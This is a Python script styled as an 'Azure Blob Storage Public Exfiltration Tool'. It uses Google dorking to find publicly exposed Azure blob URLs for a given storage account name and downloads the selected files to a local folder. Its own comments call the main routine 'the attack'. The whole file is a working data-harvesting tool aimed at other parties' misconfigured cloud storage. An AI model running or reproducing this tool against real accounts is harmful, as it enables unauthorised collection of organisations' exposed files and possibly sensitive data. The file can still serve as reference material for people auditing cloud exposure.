import os
import sys
import requests
from urllib.parse import urlparse
from bs4 import BeautifulSoup
from googlesearch import search

# Display a banner
def display_banner():
    banner = """
    -------------------------------------------------------------
    📂 Azure Blob Storage Public Exfiltration Tool 🔍
    -------------------------------------------------------------
     ____  _       _     ____       _     _           
    | __ )| | ___ | |__ |  _ \ __ _(_) __| | ___ _ __ 
    |  _ \| |/ _ \| '_ \| |_) / _` | |/ _` |/ _ \ '__|
    | |_) | | (_) | |_) |  _ < (_| | | (_| |  __/ |   
    |____/|_|\___/|_.__/|_| \_\__,_|_|\__,_|\___|_|   
    -------------------------------------------------------------
    Author: AgentN1c0l3
    Azure Blob Storage Public Exfiltration Tool
    -------------------------------------------------------------
    """
    print(banner)

# Search Google for public Azure Blob Storage URLs
def find_blob_urls(storage_account_name):
    print(f"\n🔍 Searching for public blobs related to '{storage_account_name}'...")
    query = f'site:blob.core.windows.net "{storage_account_name}"'  # Create a search query for Azure Blob Storage
    try:
        blob_urls = [url for url in search(query, num_results=10) if "blob.core.windows.net" in url]  # Perform the search and filter results to include only blob URLs
    except Exception as e:
        print(f"❌ Error while searching for blobs: {e}")
        blob_urls = [] # Initialize blob_urls as an empty list in case of error
   
    if blob_urls:
        print(f"✅ Found {len(blob_urls)} public blob URLs.")
    else:
        print(f"❌ No public blobs found for '{storage_account_name}'.")
    
    return blob_urls

# Download files from the identified blob URLs
def download_blob_files(blob_urls, folder_name):
    os.makedirs(folder_name, exist_ok=True)  # Create the download folder if it doesn't exist
    for url in blob_urls:
        try:
            response = requests.get(url) # Make a GET request to the blob URL
            response.raise_for_status()  # Raise an error for bad responses
            
            parsed_url = urlparse(url)
            filename = os.path.basename(parsed_url.path)
            file_path = os.path.join(folder_name, filename)
            
            with open(file_path, "wb") as file:
                file.write(response.content)
            print(f"📥 Downloaded {filename} to {file_path}")
        except requests.exceptions.RequestException as e:
            print(f"⚠️ Failed to download {url}: {e}")  # Print error message if download fails

# Prompt user to select files for download
def prompt_for_download(blob_urls):
    print("\nThe following files were found:")
    for idx, url in enumerate(blob_urls):
        parsed_url = urlparse(url)
        filename = os.path.basename(parsed_url.path)
        print(f"{idx + 1}: {filename} - {url}")
    
    download_choice = input("\nDo you want to download all files? (yes/no): ").lower()
    if download_choice == 'yes':
        return blob_urls  # Return all URLs if user chooses to download all
    
    selected_files = input("Enter the numbers of the files you want to download (comma-separated, e.g., 1,3,5): ")
    selected_files = selected_files.split(',')
    selected_urls = [blob_urls[int(i) - 1] for i in selected_files if i.strip().isdigit() and 0 < int(i) <= len(blob_urls)]
    
    return selected_urls

# Main function to execute the attack
def main():
    display_banner()

    # Get the storage account name pattern from the user
    storage_account_name = input("\nEnter the storage account name or pattern to search for (e.g., 'dataBlob'): ")

    # Search for public blobs using Google Dorking
    blob_urls = find_blob_urls(storage_account_name)

    if blob_urls:
        # Prompt user for download selection
        selected_urls = prompt_for_download(blob_urls)

        if selected_urls:
            # Download the files from the selected URLs
            download_folder = storage_account_name + "_downloads"
            download_blob_files(selected_urls, download_folder)
        else:
            print("No files selected for download.")
    else:
        print("No files were downloaded.")

if __name__ == '__main__':
    main()
